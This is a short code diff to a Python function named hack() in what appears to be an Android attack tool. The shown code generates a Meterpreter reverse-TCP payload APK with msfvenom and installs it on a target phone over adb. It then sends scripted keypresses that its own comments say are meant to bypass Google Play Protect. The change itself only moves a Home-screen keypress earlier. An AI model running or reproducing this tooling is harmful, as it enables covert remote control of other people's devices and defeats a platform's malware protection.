@@ -456,6 +456,7 @@ def hack():
         os.system(
             f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk")
         print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
+        os.system('adb shell input keyevent 3')  # Going on Home Screen
 
         # installing apk to device
         if operating_system == 'Windows':
@@ -469,7 +470,6 @@ def hack():
         # Keyboard input to accept app install
         print(
             f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
-        os.system('adb shell input keyevent 3')
         os.system('adb shell input keyevent 20')
         os.system('adb shell input keyevent 20')
         os.system('adb shell input keyevent 66')
